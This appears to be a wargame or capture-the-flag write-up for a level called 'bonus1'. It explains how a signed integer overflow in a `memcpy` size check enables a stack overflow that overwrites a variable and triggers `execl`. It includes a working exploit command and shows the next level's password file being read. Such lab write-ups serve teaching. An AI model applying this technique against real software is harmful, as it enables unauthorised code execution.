# Bonus1 — Integer Overflow → Buffer Overflow

## Overview

This level is not a simple overflow.
It combines:

* **Integer overflow**
* **Stack buffer overflow**
* **Logic bypass**

The trick is to abuse how the program calculates the size for `memcpy()`.

---

## 1. Program Behavior

The program takes **two arguments**:

```bash
./bonus1 <number> <data>
```

### Steps:

1. Convert first argument using `atoi()`
2. Store result in `nb`
3. If `nb <= 9` → continue
4. Copy data using:

```c
memcpy(buffer, argv[2], nb * 4);
```

5. Then check:

```c
if (nb == 0x574f4c46)
    execl(...)
```

---

## 2. Vulnerability

### Problem 1 — Size calculation

```c
nb * 4
```

* If `nb = 9` → max = `36 bytes`
* Buffer needs **40 bytes** to reach `nb`

So normally → cannot overwrite `nb`

---

### Problem 2 — Integer overflow

`nb` is a **signed 32-bit integer**

If we use a **negative number**, multiplication overflows:

```text
(nb * 4) → wraps around (mod 2^32)
```

👉 This allows us to copy **more than expected**

---

## 3. Goal

We want to overwrite:

```text
nb = 0x574f4c46   ("FLOW")
```

So that:

```c
execl(...) is executed
```

---

## 4. Finding the Trick

We need:

```text
nb * 4 = 44 bytes
```

Why?

* 40 bytes → reach `nb`
* 4 bytes → overwrite it

---

### Compute malicious value

We choose:

```text
nb = -2147483637
```

Why this works:

```text
-2147483637 * 4 → wraps → 44 bytes
```

And:

```text
-2147483637 <= 9  → passes the check
```

---

## 5. Payload

```bash
./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
```

---

## 6. Explanation

### First argument

```text
-2147483637
```

* Passes condition (`<= 9`)
* Causes integer overflow
* Produces copy size = 44

---

### Second argument

```text
"A" * 40 + "FLOW"
```

* First 40 bytes → fill buffer
* Last 4 bytes → overwrite `nb`

---

## 7. Execution Flow

1. `atoi()` → nb = -2147483637
2. Check passes (`nb <= 9`)
3. `memcpy()` copies 44 bytes
4. Overwrites `nb` with `"FLOW"`
5. Condition becomes true
6. `execl()` is called

---

## 8. Result

```bash
$ whoami
bonus2

$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

---

## 9. Key Takeaways

* Integer overflow can bypass size limits
* Signed integers are dangerous in memory operations
* Multiplication can wrap around silently
* Combining bugs → powerful exploit

---
